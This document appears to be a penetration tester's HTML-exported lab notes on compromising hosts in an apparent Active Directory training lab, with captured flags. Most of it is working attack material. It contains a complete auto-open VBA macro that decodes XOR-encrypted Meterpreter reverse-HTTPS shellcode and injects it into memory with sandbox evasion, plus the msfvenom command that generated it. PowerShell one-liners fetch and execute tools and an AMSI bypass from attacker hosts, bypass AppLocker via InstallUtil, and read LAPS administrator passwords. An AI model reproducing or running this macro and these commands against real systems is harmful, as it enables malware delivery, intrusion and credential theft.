<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>01</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>01</h1><br/><p><h2>Initial foothold</h2></p><p><ul><li>vba shellcode xor with metasploit</p><p></li></ul><div class="codebox"><pre>    <span style="color:#ff9d00;font-weight:700">Private</span> <span style="color:#ff9d00;font-weight:700">Declare</span> PtrSafe <span style="color:#ff9d00;font-weight:700">Function</span> VirtualAlloc <span style="color:#ff9d00;font-weight:700">Lib</span> <span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span> (<span style="color:#ff9d00;font-weight:700">ByVal</span> lpAddress <span style="color:#ff9d00;font-weight:700">As</span> LongPtr, <span style="color:#ff9d00;font-weight:700">ByVal</span> dwSize <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>, <span style="color:#ff9d00;font-weight:700">ByVal</span> flAllocationType <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>, <span style="color:#ff9d00;font-weight:700">ByVal</span> flProtect <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>) <span style="color:#ff9d00;font-weight:700">As</span> LongPtr<br />    <span style="color:#ff9d00;font-weight:700">Private</span> <span style="color:#ff9d00;font-weight:700">Declare</span> PtrSafe <span style="color:#ff9d00;font-weight:700">Function</span> RtlMoveMemory <span style="color:#ff9d00;font-weight:700">Lib</span> <span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span> (<span style="color:#ff9d00;font-weight:700">ByVal</span> lDestination <span style="color:#ff9d00;font-weight:700">As</span> LongPtr, <span style="color:#ff9d00;font-weight:700">ByRef</span> sSource <span style="color:#ff9d00;font-weight:700">As</span> Any, <span style="color:#ff9d00;font-weight:700">ByVal</span> lLength <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>) <span style="color:#ff9d00;font-weight:700">As</span> LongPtr<br />    <span style="color:#ff9d00;font-weight:700">Private</span> <span style="color:#ff9d00;font-weight:700">Declare</span> PtrSafe <span style="color:#ff9d00;font-weight:700">Function</span> CreateThread <span style="color:#ff9d00;font-weight:700">Lib</span> <span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span> (<span style="color:#ff9d00;font-weight:700">ByVal</span> SecurityAttributes <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>, <span style="color:#ff9d00;font-weight:700">ByVal</span> StackSize <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>, <span style="color:#ff9d00;font-weight:700">ByVal</span> StartFunction <span style="color:#ff9d00;font-weight:700">As</span> LongPtr, ThreadParameter <span style="color:#ff9d00;font-weight:700">As</span> LongPtr, <span style="color:#ff9d00;font-weight:700">ByVal</span> CreateFlags <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>, <span style="color:#ff9d00;font-weight:700">ByRef</span> ThreadId <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>) <span style="color:#ff9d00;font-weight:700">As</span> LongPtr<br />    <span style="color:#ff9d00;font-weight:700">Private</span> <span style="color:#ff9d00;font-weight:700">Declare</span> PtrSafe <span style="color:#ff9d00;font-weight:700">Function</span> Sleep <span style="color:#ff9d00;font-weight:700">Lib</span> <span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span> (<span style="color:#ff9d00;font-weight:700">ByVal</span> mili <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span>) <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span><br />    <span style="color:#ff9d00;font-weight:700">Private</span> <span style="color:#ff9d00;font-weight:700">Declare</span> PtrSafe <span style="color:#ff9d00;font-weight:700">Function</span> FlsAlloc <span style="color:#ff9d00;font-weight:700">Lib</span> <span style="color:#3ad900;font-weight:400">&quot;kernel32&quot;</span> (<span style="color:#ff9d00;font-weight:700">ByVal</span> lpCallback <span style="color:#ff9d00;font-weight:700">As</span> LongPtr) <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span><br /><br />    <span style="color:#ff9d00;font-weight:700">Sub</span> Document_Open()<br />      ShellcodeRunner<br />    <span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Sub</span><br /><br />    <span style="color:#ff9d00;font-weight:700">Sub</span> AutoOpen()<br />      ShellcodeRunner<br />    <span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Sub</span><br /><br />    <span style="color:#ff9d00;font-weight:700">Function</span> ShellcodeRunner()<br />      <span style="color:#ff9d00;font-weight:700">Dim</span> buf <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#ff9d00;font-weight:700">Variant</span><br />      <span style="color:#ff9d00;font-weight:700">Dim</span> tmp <span style="color:#ff9d00;font-weight:700">As</span> LongPtr<br />      <span style="color:#ff9d00;font-weight:700">Dim</span> addr <span style="color:#ff9d00;font-weight:700">As</span> LongPtr<br />      <span style="color:#ff9d00;font-weight:700">Dim</span> counter <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span><br />      <span style="color:#ff9d00;font-weight:700">Dim</span> data <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span><br />      <span style="color:#ff9d00;font-weight:700">Dim</span> res <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Long</span><br />      <span style="color:#ff9d00;font-weight:700">Dim</span> dream <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#ff9d00;font-weight:700">Integer</span><br />      <span style="color:#ff9d00;font-weight:700">Dim</span> before <span style="color:#ff9d00;font-weight:700">As</span> <span style="color:#7f0044;font-weight:400">Date</span><br />      <br />      <span style="color:#0088ff;font-weight:400">&#39; Check if we&#39;re in a sandbox by calling a rare-emulated API</span><br /><span style="color:#333333;font-weight:400">      If IsNull(FlsAlloc(tmp)) Then</span><br />        <span style="color:#ff9d00;font-weight:700">Exit</span> <span style="color:#ff9d00;font-weight:700">Function</span><br />      <span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">If</span><br /><br />      <span style="color:#0088ff;font-weight:400">&#39; Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction</span><br />      dream = Int((1500 * Rnd) + 2000)<br />      before = Now()<br />      Sleep (dream)<br /><span style="color:#333333;font-weight:400">      If DateDiff(&quot;s&quot;, t, Now()) &lt; dream Then</span><br />        <span style="color:#ff9d00;font-weight:700">Exit</span> <span style="color:#ff9d00;font-weight:700">Function</span><br />      <span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">If</span><br /><br />      <span style="color:#0088ff;font-weight:400">&#39; sudo msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.193 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a  ## be careful about the payload</span><br />     buf = Array(157,137,238,97,97,97,1,232,132,80,179,5,234,51,81,234,51,109,234,51,117,80,158,110,214,43,71,234,19,73,80,161,205,93,0,29,99,77,65,160,174,108,96,166,40,20,142,51,54,234,51,113,234,35,93,96,177,234,33,25,228,161,21,45,96,177,234,57,65,234,41,121,96,178,49,228,168,21,93,40,80, _<br />158,234,85,234,96,183,80,161,160,174,108,205,96,166,89,129,20,149,98,28,153,90,28,69,20,129,57,234,57,69,96,178,7,234,109,42,234,57,125,96,178,234,101,234,96,177,232,37,69,69,58,58,0,56,59,48,158,129,57,62,59,234,115,136,225,158,158,158,60,9,15,4,21,97,9,22,8,15,8,53, _<br />9,45,22,71,102,158,180,80,186,50,50,50,50,50,137,48,97,97,97,44,14,27,8,13,13,0,78,84,79,81,65,73,54,8,15,5,14,22,18,65,47,53,65,80,81,79,81,90,65,54,8,15,87,85,90,65,25,87,85,90,65,19,23,91,80,81,88,79,81,72,65,38,4,2,10,14,78,83,81,80, _<br />81,81,80,81,80,65,39,8,19,4,7,14,25,78,80,80,89,79,81,97,9,91,55,24,198,158,180,50,50,11,98,50,50,9,218,96,97,97,137,75,96,97,97,78,56,24,0,55,41,81,39,59,81,50,34,43,11,56,8,44,86,32,51,49,46,48,14,76,25,8,50,54,82,21,18,43,32,39,4,86, _<br />7,34,54,49,38,43,46,2,32,87,39,11,87,3,8,53,34,49,34,86,89,4,2,25,7,9,81,51,55,21,19,51,46,11,52,59,50,20,12,8,18,36,20,59,25,40,45,43,9,24,19,56,48,24,43,42,62,50,50,25,39,40,50,6,8,36,21,49,41,84,55,12,57,12,46,35,15,50,23,88, _<br />85,10,42,40,89,34,14,56,44,20,44,20,16,57,0,47,13,84,40,82,53,82,48,18,11,82,9,13,87,49,86,55,22,85,54,3,8,97,49,9,54,232,254,167,158,180,232,167,50,9,97,83,137,229,50,50,50,54,50,55,9,138,52,79,90,158,180,247,11,107,62,9,225,82,97,97,232,129,11,101, _<br />49,11,126,55,9,20,39,255,231,158,180,50,50,50,50,55,9,76,103,121,26,158,180,228,161,20,117,9,233,114,97,97,9,37,145,84,129,158,180,46,20,172,137,42,97,97,97,11,33,9,97,113,97,97,9,97,97,33,97,50,9,57,197,50,132,158,180,242,50,50,232,134,54,9,97,65,97,97,50,55, _<br />9,115,247,232,131,158,180,228,161,21,174,234,102,96,162,228,161,20,132,57,162,62,137,10,158,158,158,80,88,83,79,80,87,89,79,85,84,79,83,82,84,97,218,129,124,75,107,9,199,244,220,252,158,180,93,103,29,107,225,154,129,20,100,218,38,114,19,14,11,97,50,158,180)<br /><br /><br /><br />      <span style="color:#0088ff;font-weight:400">&#39; XOR-decrypt the shellcode</span><br />      <span style="color:#ff9d00;font-weight:700">For</span> i = 0 <span style="color:#ff9d00;font-weight:700">To</span> UBound(buf)<br />        buf(i) = buf(i) <span style="color:#ff9d00;font-weight:700">Xor</span> Asc(<span style="color:#3ad900;font-weight:400">&quot;a&quot;</span>)<br />      <span style="color:#ff9d00;font-weight:700">Next</span> i<br /><br />      <span style="color:#0088ff;font-weight:400">&#39; &amp;H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE</span><br />      <span style="color:#0088ff;font-weight:400">&#39; &amp;H40 = 0x40 = PAGE_EXECUTE_READWRITE</span><br />      addr = VirtualAlloc(0, UBound(buf), &amp;H3000, &amp;H40)<br /><br />      <span style="color:#ff9d00;font-weight:700">For</span> counter = LBound(buf) <span style="color:#ff9d00;font-weight:700">To</span> UBound(buf)<br />        data = buf(counter)<br />        res = RtlMoveMemory(addr + counter, data, 1)<br />      <span style="color:#ff9d00;font-weight:700">Next</span> counter<br /><br />      res = CreateThread(0, 0, addr, 0, 0, 0)<br />    <span style="color:#ff9d00;font-weight:700">End</span> <span style="color:#ff9d00;font-weight:700">Function</span></pre></div></p><p><ul><li>reverse_http</li><li>filename: 01.doc</li></ul></p><p></p><p><ul><li><small>migrate -N explorer.exe</small></li><li>flag 01: <strong>ef1a32093d9453ab31570675a2c61977</strong><ul><li>.122</li></ul></li></ul></p><p></p><p><h2>02. recon .122</h2><ul><li>• <small>• applocker enabled </small></li><li><small>CLM enabled </small><ul><li><small>$ExecutionContext.SessionState.LanguageMode</small></li></ul></li></ul></p><p></p><p> <div class="codebox"><pre>iwr <span style="color:#ff9d00;font-weight:700">-</span>uri http<span style="color:#ff9d00;font-weight:700">://</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">45.207</span><span style="color:#ff9d00;font-weight:700">/</span><span style="color:#00117f;font-weight:400">bypass-clm</span>.exe <span style="color:#ff9d00;font-weight:700">-</span>outfile <span style="color:#00117f;font-weight:400">bypass-clm</span>.exe<br />C<span style="color:#ff9d00;font-weight:700">:\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>Microsoft.NET<span style="color:#ff9d00;font-weight:700">\</span>Framework64<span style="color:#ff9d00;font-weight:700">\</span>v4.<span style="color:#333333;font-weight:400">0.30319</span><span style="color:#ff9d00;font-weight:700">\</span>InstallUtil.exe <span style="color:#ff9d00;font-weight:700">/</span>Logfile<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;&quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>LogToConsole<span style="color:#ff9d00;font-weight:700">=</span>false <span style="color:#ff9d00;font-weight:700">/</span>U <span style="color:#3ad900;font-weight:400">&quot;C:\Windows\Tasks\bypass-clm.exe&quot;</span><br /><br />iwr <span style="color:#ff9d00;font-weight:700">-</span>uri http<span style="color:#ff9d00;font-weight:700">://</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">45.156</span><span style="color:#ff9d00;font-weight:700">/</span>rev.exe <span style="color:#ff9d00;font-weight:700">-</span>Outfile rev.exe<br /><br /><span style="color:#ff9d00;font-weight:700">IEX</span>( iwr <span style="color:#ff9d00;font-weight:700">-</span>uri http<span style="color:#ff9d00;font-weight:700">://</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">45.234</span><span style="color:#ff9d00;font-weight:700">/</span>AmsiBypass.ps1 <span style="color:#ff9d00;font-weight:700">-</span>Outfile AmsiBypass.ps1)<br /><br /><span style="color:#0088ff;font-weight:400">## I don&#39;t need to bypass it as I can use program for execution *</span><br />C<span style="color:#ff9d00;font-weight:700">:\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>Microsoft.NET<span style="color:#ff9d00;font-weight:700">\</span>Framework64<span style="color:#ff9d00;font-weight:700">\</span>v4.<span style="color:#333333;font-weight:400">0.30319</span><span style="color:#ff9d00;font-weight:700">\</span>installutil.exe <span style="color:#ff9d00;font-weight:700">/</span>logfile<span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">/</span>LogToConsole<span style="color:#ff9d00;font-weight:700">=</span>false <span style="color:#ff9d00;font-weight:700">/</span>U clmbypass.exe<br /><span style="color:#0088ff;font-weight:400">## workds !!!! </span><br /><span style="color:#0088ff;font-weight:400">### sharphound </span><br />(<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient).DownloadString(<span style="color:#333333;font-weight:400">&#39;http://192.168.45.193/SharpHound.ps1&#39;</span>) | <span style="color:#ff9d00;font-weight:700">IEX</span>; <span style="color:#00117f;font-weight:400">Invoke-Bloodhound</span> <span style="color:#ff9d00;font-weight:700">-</span>CollectionMethod All <br /></pre></div><ul><li></li></ul><img src="images/66-1.png" alt="images/66-1.png" /></p><p></p><p></p><p><h2>Bloodhound analysis</h2><ul><li><h2>• </h2>• ted can read laps passwords on both client.inifinity.com and web05.infinity.com</li><li></li></ul><div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>Microsoft.NET<span style="color:#ff9d00;font-weight:700">\</span>Framework64<span style="color:#ff9d00;font-weight:700">\</span>v4.<span style="color:#333333;font-weight:400">0.30319</span><span style="color:#ff9d00;font-weight:700">\</span>installutil.exe <span style="color:#ff9d00;font-weight:700">/</span>logfile<span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">/</span>LogToConsole<span style="color:#ff9d00;font-weight:700">=</span>false <span style="color:#ff9d00;font-weight:700">/</span>U clmbypass.exe<br /><span style="color:#ff9d00;font-weight:700">IEX</span> (<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).DownloadString(<span style="color:#333333;font-weight:400">&#39;http://192.168.45.235/PowerView.ps1&#39;</span>) ; <span style="color:#00117f;font-weight:400">Get-ADObject</span> <span style="color:#333333;font-weight:400">-Name</span> web05 <span style="color:#ff9d00;font-weight:700">-</span>DomainController <span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">175.120</span> <span style="color:#ff9d00;font-weight:700">-</span>Properties <span style="color:#00117f;font-weight:400">ms-mcs-admpwd</span><br /><br /> <span style="color:#00117f;font-weight:400">Get-ADObject</span> <span style="color:#333333;font-weight:400">-Name</span> client <span style="color:#ff9d00;font-weight:700">-</span>DomainController <span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">175.120</span> <span style="color:#ff9d00;font-weight:700">-</span>Properties <span style="color:#00117f;font-weight:400">ms-mcs-admpwd</span><br /> <br /><span style="color:#0088ff;font-weight:400">## on web05 switch to system/admin so we can access domain </span><br />.<span style="color:#ff9d00;font-weight:700">\</span>PsExec64.exe <span style="color:#ff9d00;font-weight:700">-</span>accepteula <span style="color:#ff9d00;font-weight:700">-</span>s <span style="color:#ff9d00;font-weight:700">-</span>i cmd.exe </pre></div></p><p></p><p></p><p><h2>WEB05 (121)</h2></p><p></p><p>Proof.txt <strong>6f8d922237000b521a53769c637756d3</strong></p></div>
</body>
</html>
